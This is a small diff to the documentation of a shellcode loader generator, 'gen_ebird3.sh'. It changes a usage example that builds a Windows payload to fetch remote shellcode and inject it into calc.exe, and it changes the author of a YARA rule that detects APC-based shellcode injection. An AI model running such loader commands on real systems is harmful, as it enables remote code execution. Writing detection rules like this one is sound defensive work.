@@ -65,7 +65,7 @@ sudo apt install mingw-w64
 ```bash
 ./gen_ebird3.sh \
   --target windows \
-  --url "http://192.168.1.100/shellcode.bin" \
+  --url "http://192.168.1.100/shellcode.txt" \
   --process-name "C:/Windows/System32/calc.exe" \
   --key 0x33
 ```
@@ -152,7 +152,7 @@ Heuristic: Suspicious Memory Allocation + APC
 ```yara
 rule ebird3_NtQueueApcThread_Heuristic {
     meta:
-        author = "EDR Team"
+        author = "LazyOwn BlueTeam"
         description = "Detects use of NtQueueApcThread for shellcode execution"
 
     strings:
